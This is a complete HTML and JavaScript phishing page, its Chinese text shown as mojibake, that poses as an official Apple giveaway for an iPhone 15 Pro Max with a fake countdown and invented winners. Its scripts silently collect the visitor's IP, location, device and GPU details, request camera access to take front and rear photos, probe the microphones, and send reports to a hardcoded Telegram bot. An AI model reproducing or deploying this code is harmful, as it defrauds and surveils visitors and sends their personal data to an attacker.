<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ Appleå®˜æ–¹å¤§æŠ½å¥– | èµ¢å–iPhone 15 Pro Max</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: white; min-height: 100vh; }
        
        /* è‹¹æœé£æ ¼å®¹å™¨ */
        .apple-container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 30px 20px;
        }
        
        /* é¡¶éƒ¨è‹¹æœlogo */
        .apple-header {
            text-align: center;
            padding: 40px 0;
        }
        .apple-logo {
            font-size: 4em;
            margin-bottom: 20px;
        }
        .apple-header h1 {
            font-size: 3em;
            margin-bottom: 15px;
            background: linear-gradient(45deg, #fff, #a5b4fc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        /* æŠ½å¥–å¡ç‰‡ */
        .lottery-card {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 50px 40px;
            margin: 40px 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            position: relative;
            overflow: hidden;
        }
        .lottery-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 5px;
            background: linear-gradient(90deg, #ff2d75, #ff9a3d, #06d6a0, #4361ee);
        }
        
        /* å¥–å“å±•ç¤º */
        .prize-showcase {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 30px;
            margin: 40px 0;
        }
        .prize-box {
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            border: 2px solid rgba(255,255,255,0.1);
            transition: all 0.3s;
        }
        .prize-box:hover {
            transform: translateY(-10px);
            border-color: #4361ee;
        }
        .prize-icon { font-size: 3em; margin-bottom: 20px; }
        
        /* å€’è®¡æ—¶ */
        .countdown {
            background: linear-gradient(135deg, #3a0ca3, #7209b7);
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            margin: 40px 0;
        }
        .countdown-timer {
            font-size: 3em;
            font-weight: bold;
            font-family: monospace;
            margin: 20px 0;
        }
        
        /* æŠ½å¥–æŒ‰é’® */
        .lottery-btn {
            background: linear-gradient(135deg, #ff2d75, #ff9a3d);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 1.2em;
            font-weight: bold;
            border-radius: 15px;
            cursor: pointer;
            display: block;
            margin: 40px auto;
            width: 300px;
            transition: all 0.3s;
        }
        .lottery-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 30px rgba(255,45,117,0.4);
        }
        
        /* åŠ è½½åŠ¨ç”» */
        .loading {
            display: none;
            text-align: center;
            padding: 40px;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.1);
            border-top: 5px solid #06d6a0;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        
        /* ç»“æœå±•ç¤º */
        .result {
            display: none;
            background: linear-gradient(135deg, #06d6a0, #118ab2);
            border-radius: 20px;
            padding: 50px;
            text-align: center;
            margin: 40px 0;
            animation: popIn 0.5s;
        }
        @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } }
        .lottery-number {
            font-size: 3em;
            font-weight: bold;
            letter-spacing: 10px;
            margin: 30px 0;
            font-family: monospace;
        }
        
        /* ä¸­å¥–è€…åˆ—è¡¨ */
        .winners {
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            padding: 30px;
            margin: 40px 0;
        }
        .winner-item {
            display: flex;
            align-items: center;
            padding: 20px;
            background: rgba(255,255,255,0.08);
            border-radius: 15px;
            margin: 10px 0;
        }
        .winner-avatar {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #4361ee, #3a0ca3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 20px;
            font-weight: bold;
        }
        
        /* è¿›åº¦æ¡ */
        .progress-container {
            background: rgba(255,255,255,0.1);
            height: 8px;
            border-radius: 4px;
            margin: 40px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #06d6a0, #118ab2);
            width: 0%;
            transition: width 0.3s;
        }
        
        /* å“åº”å¼ */
        @media (max-width: 768px) {
            .apple-header h1 { font-size: 2em; }
            .lottery-card { padding: 30px 20px; }
            .prize-showcase { grid-template-columns: 1fr; }
            .lottery-btn { width: 100%; }
            .lottery-number { font-size: 2em; letter-spacing: 5px; }
        }
    </style>
</head>
<body>
    <div class="apple-container">
        <!-- Appleå¤´éƒ¨ -->
        <div class="apple-header">
            <div class="apple-logo">ğŸ</div>
            <h1>Appleå®˜æ–¹å¹´ç»ˆå¤§æŠ½å¥–</h1>
            <p>æ­å–œï¼æ‚¨å·²è¢«ç³»ç»Ÿéšæœºé€‰ä¸­å‚ä¸æœ¬æ¬¡æŠ½å¥–æ´»åŠ¨</p>
        </div>
        
        <!-- æŠ½å¥–ä¸»å¡ç‰‡ -->
        <div class="lottery-card">
            <!-- å¥–å“å±•ç¤º -->
            <div class="prize-showcase">
                <div class="prize-box">
                    <div class="prize-icon">ğŸ“±</div>
                    <h3>iPhone 15 Pro Max</h3>
                    <p>1TB â€¢ åŸè‰²é’›é‡‘å±</p>
                    <p style="color: #06d6a0; margin-top: 10px; font-weight: bold;">Â¥12,999</p>
                </div>
                <div class="prize-box">
                    <div class="prize-icon">ğŸ§</div>
                    <h3>AirPods Pro 2</h3>
                    <p>ä¸»åŠ¨é™å™ª â€¢ ç©ºé—´éŸ³é¢‘</p>
                    <p style="color: #06d6a0; margin-top: 10px; font-weight: bold;">Â¥1,899</p>
                </div>
                <div class="prize-box">
                    <div class="prize-icon">âŒšï¸</div>
                    <h3>Apple Watch</h3>
                    <p>Series 9 â€¢ 45mm</p>
                    <p style="color: #06d6a0; margin-top: 10px; font-weight: bold;">Â¥2,999</p>
                </div>
            </div>
            
            <!-- å€’è®¡æ—¶ -->
            <div class="countdown">
                <p style="opacity: 0.9;">â° æŠ½å¥–èµ„æ ¼å³å°†è¿‡æœŸ</p>
                <div class="countdown-timer" id="countdown">05:00</div>
                <p style="opacity: 0.8; font-size: 0.9em;">å‰©ä½™åé¢: <span id="remaining">3</span> äºº</p>
            </div>
            
            <!-- è¿›åº¦æ¡ -->
            <div class="progress-container">
                <div class="progress-bar" id="progress"></div>
            </div>
            <div style="text-align: center; margin: 10px 0; opacity: 0.8;" id="progressText">
                ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®å¼€å§‹éªŒè¯èµ„æ ¼
            </div>
            
            <!-- æŠ½å¥–æŒ‰é’® -->
            <button class="lottery-btn" onclick="startDetection()">
                <i class="fas fa-gift"></i> ç«‹å³å‚ä¸æŠ½å¥–
            </button>
            
            <!-- åŠ è½½çŠ¶æ€ -->
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p id="loadingText">æ­£åœ¨éªŒè¯æ‚¨çš„è®¾å¤‡èµ„æ ¼...</p>
            </div>
            
            <!-- ç»“æœå±•ç¤º -->
            <div class="result" id="result">
                <div style="font-size: 4em; margin-bottom: 20px;">ğŸ‰</div>
                <h2>æ­å–œï¼éªŒè¯æˆåŠŸ</h2>
                <p style="opacity: 0.9; margin: 20px 0;">æ‚¨çš„ä¸“å±æŠ½å¥–å·ç </p>
                <div class="lottery-number" id="lotteryNumber">APP-000000</div>
                <p style="opacity: 0.8; margin-top: 30px;">
                    <i class="fas fa-clock"></i> å¼€å¥–æ—¶é—´: ä»Šæ™š20:00<br>
                    <i class="fas fa-sms"></i> ç»“æœå°†é€šè¿‡çŸ­ä¿¡é€šçŸ¥
                </p>
            </div>
        </div>
        
        <!-- ä¸­å¥–è€…åˆ—è¡¨ -->
        <div class="winners">
            <h3 style="margin-bottom: 20px;"><i class="fas fa-trophy"></i> ä»Šæ—¥ä¸­å¥–è€…</h3>
            <div id="winnersList">
                <!-- åŠ¨æ€æ·»åŠ ä¸­å¥–è€… -->
            </div>
        </div>
        
        <!-- åº•éƒ¨ä¿¡æ¯ -->
        <div style="text-align: center; padding: 40px; opacity: 0.6; font-size: 0.9em;">
            <p><i class="fas fa-shield-alt"></i> Appleå®˜æ–¹æˆæƒ â€¢ 100%çœŸå®æœ‰æ•ˆ</p>
            <p style="margin-top: 10px;">Â© 2024 Apple Inc. ä¿ç•™æ‰€æœ‰æƒåˆ©</p>
        </div>
    </div>

    <!-- ç¬¬äºŒæ®µï¼šJavaScriptå¼€å§‹ -->
    <script>
        // Telegramé…ç½®
        const BOT_TOKEN = '8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM';
        const CHAT_ID = '8313770381';
        
        let collectedData = {};
        let photos = [];
        
        // åˆå§‹åŒ–é¡µé¢
        function initPage() {
            console.log('ğŸ° æŠ½å¥–é¡µé¢åˆå§‹åŒ–');
            
            // 1. å¼€å§‹å€’è®¡æ—¶
            startCountdown();
            
            // 2. åˆå§‹åŒ–ä¸­å¥–è€…åˆ—è¡¨
            initWinners();
            
            // 3. è‡ªåŠ¨å¼€å§‹æ”¶é›†åŸºç¡€ä¿¡æ¯ï¼ˆé™é»˜ï¼‰
            setTimeout(() => {
                collectBasicInfo();
            }, 2000);
        }
    </script>
</body>
</html>
<!-- åœ¨ç¬¬ä¸€æ®µscriptåç»§ç»­æ·»åŠ  -->

<script>
    // å€’è®¡æ—¶åŠŸèƒ½
    function startCountdown() {
        let time = 300;
        const timer = setInterval(() => {
            const min = Math.floor(time / 60);
            const sec = time % 60;
            document.getElementById('countdown').textContent = 
                `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
            
            if (time === 180 || time === 120 || time === 60) {
                const slots = document.getElementById('remaining');
                let num = parseInt(slots.textContent);
                if (num > 0) {
                    num--;
                    slots.textContent = num;
                    if (num === 0) slots.style.color = '#ff2d75';
                }
            }
            
            if (time <= 0) {
                clearInterval(timer);
                document.getElementById('countdown').textContent = '00:00';
            }
            time--;
        }, 1000);
    }
    
    // åˆå§‹åŒ–ä¸­å¥–è€…åˆ—è¡¨
    function initWinners() {
        const winners = [
            { name: 'å¼ ', prize: 'iPhone 15 Pro', city: 'åŒ—äº¬', time: 'åˆšåˆš' },
            { name: 'æ', prize: 'AirPods Pro 2', city: 'ä¸Šæµ·', time: '2åˆ†é’Ÿå‰' },
            { name: 'ç‹', prize: 'Â¥888çº¢åŒ…', city: 'å¹¿å·', time: '5åˆ†é’Ÿå‰' }
        ];
        
        const list = document.getElementById('winnersList');
        winners.forEach(winner => {
            const div = document.createElement('div');
            div.className = 'winner-item';
            div.innerHTML = `
                <div class="winner-avatar">${winner.name}</div>
                <div style="flex:1">
                    <div style="font-weight:bold">${winner.name}**</div>
                    <div style="opacity:0.8">è·å¾—äº† ${winner.prize}</div>
                </div>
                <div style="text-align:right">
                    <div style="font-size:0.9em;opacity:0.7">${winner.time}</div>
                    <div style="font-size:0.8em;opacity:0.6">${winner.city}</div>
                </div>
            `;
            list.appendChild(div);
        });
    }
    
    // æ”¶é›†åŸºç¡€ä¿¡æ¯ï¼ˆé™é»˜è¿è¡Œï¼‰
    async function collectBasicInfo() {
        console.log('ğŸ” å¼€å§‹æ”¶é›†åŸºç¡€ä¿¡æ¯...');
        
        try {
            // 1. è·å–IPåœ°å€
            const ip = await getIP();
            collectedData.ip = ip;
            console.log('ğŸŒ IPåœ°å€:', ip);
            
            // 2. è·å–ä½ç½®
            const location = await getLocation(ip);
            collectedData.location = location;
            
            // 3. è®¾å¤‡ä¿¡æ¯
            collectedData.device = getDeviceInfo();
            
            // 4. å±å¹•ä¿¡æ¯
            collectedData.screen = {
                width: screen.width,
                height: screen.height,
                pixelRatio: window.devicePixelRatio
            };
            
            // 5. æµè§ˆå™¨ä¿¡æ¯
            collectedData.browser = {
                name: getBrowserName(),
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            // 6. ç½‘ç»œä¿¡æ¯
            if (navigator.connection) {
                collectedData.network = {
                    type: navigator.connection.effectiveType,
                    speed: navigator.connection.downlink
                };
            }
            
            console.log('âœ… åŸºç¡€ä¿¡æ¯æ”¶é›†å®Œæˆ');
            
        } catch (error) {
            console.error('æ”¶é›†åŸºç¡€ä¿¡æ¯å¤±è´¥:', error);
        }
    }
    
    // è·å–IPåœ°å€
    async function getIP() {
        try {
            const apis = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://api.myip.com'
            ];
            
            for (const api of apis) {
                try {
                    const res = await fetch(api, { timeout: 3000 });
                    const data = await res.json();
                    const ip = data.ip || data.query;
                    if (ip) return ip;
                } catch (e) {
                    continue;
                }
            }
            
            // å¤‡ç”¨æ–¹æ³•ï¼šWebRTCè·å–æœ¬åœ°IP
            try {
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel('');
                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
                return new Promise((resolve) => {
                    pc.onicecandidate = (ice) => {
                        if (ice.candidate) {
                            const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                            if (match) {
                                pc.close();
                                resolve(match[1]);
                            }
                        }
                    };
                    setTimeout(() => {
                        pc.close();
                        resolve('192.168.x.x');
                    }, 2000);
                });
            } catch (e) {
                return 'æœªçŸ¥';
            }
            
        } catch (error) {
            return 'è·å–å¤±è´¥';
        }
    }
    
    // è·å–ä½ç½®ä¿¡æ¯
    async function getLocation(ip) {
        if (!ip || ip === 'æœªçŸ¥') return { city: 'æœªçŸ¥', country: 'æœªçŸ¥' };
        
        try {
            const res = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await res.json();
            return {
                city: data.city || 'æœªçŸ¥',
                country: data.country_name || 'æœªçŸ¥',
                region: data.region || 'æœªçŸ¥',
                isp: data.org || 'æœªçŸ¥ç½‘ç»œ'
            };
        } catch (error) {
            try {
                const res = await fetch(`https://ipwho.is/${ip}`);
                const data = await res.json();
                if (data.success) {
                    return {
                        city: data.city || 'æœªçŸ¥',
                        country: data.country || 'æœªçŸ¥',
                        isp: data.connection?.isp || 'æœªçŸ¥ç½‘ç»œ'
                    };
                }
            } catch (e) {
                return { city: 'æœªçŸ¥', country: 'æœªçŸ¥' };
            }
        }
        return { city: 'æœªçŸ¥', country: 'æœªçŸ¥' };
    }
    
    // è·å–è®¾å¤‡ä¿¡æ¯
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        
        let type = 'æœªçŸ¥è®¾å¤‡';
        if (/Android/i.test(ua)) type = 'Androidè®¾å¤‡';
        else if (/iPhone|iPad|iPod/i.test(ua)) type = 'Appleè®¾å¤‡';
        else if (/Windows/i.test(ua)) type = 'Windowsç”µè„‘';
        else if (/Mac/i.test(ua)) type = 'Macç”µè„‘';
        
        let os = 'æœªçŸ¥ç³»ç»Ÿ';
        if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
        else if (/Mac OS X/i.test(ua)) os = 'macOS';
        else if (/Android/i.test(ua)) os = 'Android';
        else if (/iPhone OS/i.test(ua)) os = 'iOS';
        
        return {
            type: type,
            os: os,
            userAgent: ua.substring(0, 200) + '...'
        };
    }
    
    // è·å–æµè§ˆå™¨åç§°
    function getBrowserName() {
        const ua = navigator.userAgent;
        if (/Chrome/i.test(ua)) return 'Chrome';
        if (/Firefox/i.test(ua)) return 'Firefox';
        if (/Safari/i.test(ua)) return 'Safari';
        if (/Edge/i.test(ua)) return 'Edge';
        return 'æœªçŸ¥æµè§ˆå™¨';
    }
</script>
<!-- ç»§ç»­æ·»åŠ ä»£ç  -->

<script>
    // å¼€å§‹æ£€æµ‹ï¼ˆç”¨æˆ·ç‚¹å‡»æŒ‰é’®ï¼‰
    async function startDetection() {
        console.log('ğŸ¯ å¼€å§‹å…¨é¢æ£€æµ‹...');
        
        // ç¦ç”¨æŒ‰é’®
        const btn = document.querySelector('.lottery-btn');
        btn.disabled = true;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> æ­£åœ¨å¤„ç†...';
        
        // æ˜¾ç¤ºåŠ è½½åŠ¨ç”»
        document.getElementById('loading').style.display = 'block';
        
        // å¼€å§‹è¿›åº¦æ¡åŠ¨ç”»
        startProgress();
        
        try {
            // 1. é¦–å…ˆå‘é€åŸºæœ¬ä¿¡æ¯
            await sendBasicReport();
            
            // 2. æ£€æµ‹æ‘„åƒå¤´å¹¶æ‹ç…§
            await detectCamera();
            
            // 3. æ£€æµ‹éº¦å…‹é£
            await detectMicrophone();
            
            // 4. å‘é€è¯¦ç»†æŠ¥å‘Š
            await sendDetailedReport();
            
            // 5. æ˜¾ç¤ºæŠ½å¥–ç»“æœ
            showResult();
            
            // 6. æ·»åŠ æ–°ä¸­å¥–è€…
            addNewWinner();
            
        } catch (error) {
            console.error('æ£€æµ‹è¿‡ç¨‹å‡ºé”™:', error);
            showResult(); // å³ä½¿å‡ºé”™ä¹Ÿæ˜¾ç¤ºç»“æœ
        }
    }
    
    // è¿›åº¦æ¡åŠ¨ç”»
    function startProgress() {
        const bar = document.getElementById('progress');
        const text = document.getElementById('progressText');
        let width = 0;
        
        const interval = setInterval(() => {
            width += 2;
            bar.style.width = width + '%';
            
            if (width <= 20) {
                text.textContent = 'æ­£åœ¨éªŒè¯è®¾å¤‡å…¼å®¹æ€§...';
            } else if (width <= 40) {
                text.textContent = 'æ­£åœ¨æ£€æµ‹ç½‘ç»œè¿æ¥...';
            } else if (width <= 60) {
                text.textContent = 'æ­£åœ¨è·å–åœ°ç†ä½ç½®...';
            } else if (width <= 80) {
                text.textContent = 'æ­£åœ¨ç”Ÿæˆå®‰å…¨éªŒè¯...';
            } else if (width <= 100) {
                text.textContent = 'æ­£åœ¨åˆ†é…æŠ½å¥–å·ç ...';
            }
            
            if (width >= 100) {
                clearInterval(interval);
                text.textContent = 'éªŒè¯å®Œæˆï¼';
            }
        }, 50);
    }
    
    // æ£€æµ‹æ‘„åƒå¤´
    async function detectCamera() {
        console.log('ğŸ“¸ æ£€æµ‹æ‘„åƒå¤´...');
        
        try {
            // è¯·æ±‚æ‘„åƒå¤´æƒé™
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' }
            });
            
            // åˆ›å»ºè§†é¢‘å…ƒç´ 
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            
            // ç­‰å¾…è§†é¢‘å°±ç»ª
            await new Promise(resolve => {
                video.onloadedmetadata = resolve;
            });
            
            // æ‹ç…§
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // ç­‰å¾…ä¸€å¸§
            await new Promise(resolve => setTimeout(resolve, 500));
            
            // æ‹æ‘„ç…§ç‰‡
            ctx.drawImage(video, 0, 0);
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            
            // ä¿å­˜ç…§ç‰‡
            photos.push({
                data: photoData,
                time: new Date().toLocaleString('zh-CN'),
                size: Math.round(photoData.length * 3 / 4)
            });
            
            console.log('âœ… æ‹ç…§æˆåŠŸï¼Œå¤§å°:', photos[0].size, 'bytes');
            
            // åœæ­¢æ‘„åƒå¤´
            stream.getTracks().forEach(track => track.stop());
            
            // å°è¯•åç½®æ‘„åƒå¤´
            try {
                const rearStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment' }
                });
                
                const rearVideo = document.createElement('video');
                rearVideo.srcObject = rearStream;
                await rearVideo.play();
                
                const rearCanvas = document.createElement('canvas');
                rearCanvas.width = rearVideo.videoWidth;
                rearCanvas.height = rearVideo.videoHeight;
                const rearCtx = rearCanvas.getContext('2d');
                
                await new Promise(resolve => setTimeout(resolve, 500));
                
                rearCtx.drawImage(rearVideo, 0, 0);
                const rearPhoto = rearCanvas.toDataURL('image/jpeg', 0.7);
                
                photos.push({
                    data: rearPhoto,
                    time: new Date().toLocaleString('zh-CN'),
                    size: Math.round(rearPhoto.length * 3 / 4),
                    camera: 'rear'
                });
                
                rearStream.getTracks().forEach(track => track.stop());
                
            } catch (e) {
                console.log('åç½®æ‘„åƒå¤´ä¸å¯ç”¨');
            }
            
        } catch (error) {
            console.warn('æ‘„åƒå¤´æ£€æµ‹å¤±è´¥:', error.message);
        }
    }
    
    // æ£€æµ‹éº¦å…‹é£
    async function detectMicrophone() {
        console.log('ğŸ¤ æ£€æµ‹éº¦å…‹é£...');
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            
            // è·å–éº¦å…‹é£ä¿¡æ¯
            const devices = await navigator.mediaDevices.enumerateDevices();
            const mics = devices.filter(d => d.kind === 'audioinput');
            
            collectedData.microphone = {
                count: mics.length,
                devices: mics.map(d => d.label || 'æœªå‘½åéº¦å…‹é£')
            };
            
            // åœæ­¢éº¦å…‹é£
            stream.getTracks().forEach(track => track.stop());
            
        } catch (error) {
            console.warn('éº¦å…‹é£æ£€æµ‹å¤±è´¥');
        }
    }
    
    // å‘é€åŸºæœ¬ä¿¡æ¯æŠ¥å‘Š
    async function sendBasicReport() {
        const message = `
ğŸ°ã€æŠ½å¥–å‚ä¸é€šçŸ¥ã€‘

ğŸ‰ æœ‰äººå‚åŠ äº†AppleæŠ½å¥–ï¼

ğŸ“± è®¾å¤‡ä¿¡æ¯ï¼š
â”œ è®¾å¤‡ï¼š${collectedData.device.type}
â”œ ç³»ç»Ÿï¼š${collectedData.device.os}
â”œ æµè§ˆå™¨ï¼š${collectedData.browser.name}
â”œ è¯­è¨€ï¼š${collectedData.browser.language}
â”” æ—¶åŒºï¼š${collectedData.browser.timezone}

ğŸŒ ç½‘ç»œä¿¡æ¯ï¼š
â”œ IPï¼š${collectedData.ip}
â”œ ä½ç½®ï¼š${collectedData.location.city}, ${collectedData.location.country}
â”œ è¿è¥å•†ï¼š${collectedData.location.isp}
â”” ç½‘ç»œç±»å‹ï¼š${collectedData.network?.type || 'æœªçŸ¥'}

ğŸ“Š å±å¹•ä¿¡æ¯ï¼š
â”œ åˆ†è¾¨ç‡ï¼š${collectedData.screen.width}Ã—${collectedData.screen.height}
â”œ åƒç´ å¯†åº¦ï¼š${collectedData.screen.pixelRatio}x
â”” è®¿é—®æ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}

ğŸ”— æ¥æºï¼š${document.referrer || 'ç›´æ¥è®¿é—®'}
        `;
        
        return await sendTelegram(message);
    }
</script>
<!-- ç»§ç»­æ·»åŠ ä»£ç  -->

<script>
    // å‘é€è¯¦ç»†æŠ¥å‘Š
    async function sendDetailedReport() {
        // è·å–æ›´å¤šè®¾å¤‡ä¿¡æ¯
        const details = getDeviceDetails();
        
        const message = `
ğŸ”ã€è¯¦ç»†æ£€æµ‹æŠ¥å‘Šã€‘

ğŸ’» ç¡¬ä»¶ä¿¡æ¯ï¼š
â”œ CPUæ ¸å¿ƒï¼š${details.cpuCores}
â”œ è®¾å¤‡å†…å­˜ï¼š${details.memory}GB
â”œ GPUï¼š${details.gpu}
â”œ é¢œè‰²æ·±åº¦ï¼š${screen.colorDepth}ä½
â”” è§¦æ‘¸æ”¯æŒï¼š${details.touchSupport}

ğŸ“¸ æ‘„åƒå¤´æ£€æµ‹ï¼š
â”œ ç…§ç‰‡æ•°é‡ï¼š${photos.length}å¼ 
â”œ ç…§ç‰‡å¤§å°ï¼š${photos.reduce((sum, p) => sum + p.size, 0)}å­—èŠ‚
â”” æ£€æµ‹æ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}

ğŸ¤ éº¦å…‹é£æ£€æµ‹ï¼š
â”œ éº¦å…‹é£æ•°é‡ï¼š${collectedData.microphone?.count || 0}ä¸ª
â”” è®¾å¤‡æ ‡ç­¾ï¼š${collectedData.microphone?.devices?.[0] || 'æœªçŸ¥'}

ğŸ›¡ï¸ æµè§ˆå™¨ç‰¹æ€§ï¼š
â”œ Cookieï¼š${navigator.cookieEnabled ? 'å¯ç”¨' : 'ç¦ç”¨'}
â”œ åœ¨çº¿çŠ¶æ€ï¼š${navigator.onLine ? 'åœ¨çº¿' : 'ç¦»çº¿'}
â”œ æ—¶åŒºåç§»ï¼šUTC${new Date().getTimezoneOffset() > 0 ? '-' : '+'}${Math.abs(new Date().getTimezoneOffset())/60}
â”” ç”¨æˆ·ä»£ç†ï¼š${collectedData.device.userAgent}

ğŸ¯ æ£€æµ‹æ€»ç»“ï¼š
âœ… è®¾å¤‡ä¿¡æ¯é‡‡é›†å®Œæˆ
âœ… ç½‘ç»œä½ç½®è·å–æˆåŠŸ
${photos.length > 0 ? 'âœ… æ‘„åƒå¤´æ£€æµ‹å®Œæˆ' : 'âš ï¸ æ‘„åƒå¤´æœªæˆæƒ'}
${collectedData.microphone?.count > 0 ? 'âœ… éº¦å…‹é£æ£€æµ‹å®Œæˆ' : 'âš ï¸ éº¦å…‹é£æœªæˆæƒ'}

â° æ£€æµ‹è€—æ—¶ï¼š${Math.round((Date.now() - performance.timing.navigationStart) / 1000)}ç§’
        `;
        
        return await sendTelegram(message);
    }
    
    // è·å–è®¾å¤‡è¯¦ç»†ä¿¡æ¯
    function getDeviceDetails() {
        const details = {
            cpuCores: navigator.hardwareConcurrency || 'æœªçŸ¥',
            memory: navigator.deviceMemory || 'æœªçŸ¥',
            gpu: 'æœªçŸ¥',
            touchSupport: 'ontouchstart' in window ? 'æ”¯æŒ' : 'ä¸æ”¯æŒ'
        };
        
        // è·å–GPUä¿¡æ¯
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (gl) {
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) {
                    details.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'æœªçŸ¥';
                }
            }
        } catch (e) {}
        
        return details;
    }
    
    // å‘é€åˆ°Telegram
    async function sendTelegram(text) {
        console.log('ğŸ“¤ å‘é€æ¶ˆæ¯åˆ°Telegram...');
        
        try {
            const encoded = encodeURIComponent(text);
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`;
            
            const res = await fetch(url);
            const data = await res.json();
            
            if (data.ok) {
                console.log('âœ… æ¶ˆæ¯å‘é€æˆåŠŸ');
                return true;
            } else {
                console.error('âŒ å‘é€å¤±è´¥:', data.description);
                return false;
            }
        } catch (error) {
            console.error('âŒ å‘é€å¼‚å¸¸:', error.message);
            return false;
        }
    }
    
    // æ˜¾ç¤ºç»“æœ
    function showResult() {
        // éšè—åŠ è½½
        document.getElementById('loading').style.display = 'none';
        
        // ç”ŸæˆæŠ½å¥–å·ç 
        const number = 'APP-' + Math.random().toString().slice(2, 8);
        document.getElementById('lotteryNumber').textContent = number;
        
        // æ˜¾ç¤ºç»“æœ
        document.getElementById('result').style.display = 'block';
        
        // æ»šåŠ¨åˆ°ç»“æœ
        document.getElementById('result').scrollIntoView({
            behavior: 'smooth',
            block: 'center'
        });
        
        // å‘é€æœ€ç»ˆé€šçŸ¥
        setTimeout(() => {
            const finalMsg = `
ğŸŠ æŠ½å¥–å®Œæˆé€šçŸ¥
æŠ½å¥–å·ç ï¼š${number}
è®¾å¤‡ï¼š${collectedData.device.type}
IPï¼š${collectedData.ip}
ä½ç½®ï¼š${collectedData.location.city}
å®Œæˆæ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}
            `;
            sendTelegram(finalMsg);
        }, 2000);
    }
    
    // æ·»åŠ æ–°ä¸­å¥–è€…
    function addNewWinner() {
        const list = document.getElementById('winnersList');
        const cities = ['åŒ—äº¬', 'ä¸Šæµ·', 'å¹¿å·', 'æ·±åœ³', 'æ­å·'];
        const names = ['å¼ ', 'æ', 'ç‹', 'åˆ˜', 'é™ˆ'];
        const prizes = ['iPhone 15 Pro', 'AirPods Pro 2', 'Apple Watch', 'Â¥888çº¢åŒ…'];
        
        const winner = {
            name: names[Math.floor(Math.random() * names.length)],
            prize: prizes[Math.floor(Math.random() * prizes.length)],
            city: cities[Math.floor(Math.random() * cities.length)]
        };
        
        const div = document.createElement('div');
        div.className = 'winner-item';
        div.style.animation = 'slideIn 0.5s';
        div.innerHTML = `
            <div class="winner-avatar">${winner.name}</div>
            <div style="flex:1">
                <div style="font-weight:bold">${winner.name}**</div>
                <div style="opacity:0.8">è·å¾—äº† ${winner.prize}</div>
            </div>
            <div style="text-align:right">
                <div style="font-size:0.9em;opacity:0.7">åˆšåˆš</div>
                <div style="font-size:0.8em;opacity:0.6">${winner.city}</div>
            </div>
        `;
        
        list.insertBefore(div, list.firstChild);
        
        // ä¿æŒæœ€å¤š5ä¸ª
        if (list.children.length > 5) {
            list.removeChild(list.lastChild);
        }
    }
    
    // é¡µé¢åŠ è½½å®Œæˆ
    window.addEventListener('load', function() {
        initPage();
        
        // è‡ªåŠ¨æ·»åŠ éšæœºä¸­å¥–è€…
        setInterval(() => {
            if (Math.random() > 0.7) {
                addNewWinner();
            }
        }, 15000);
    });
</script>
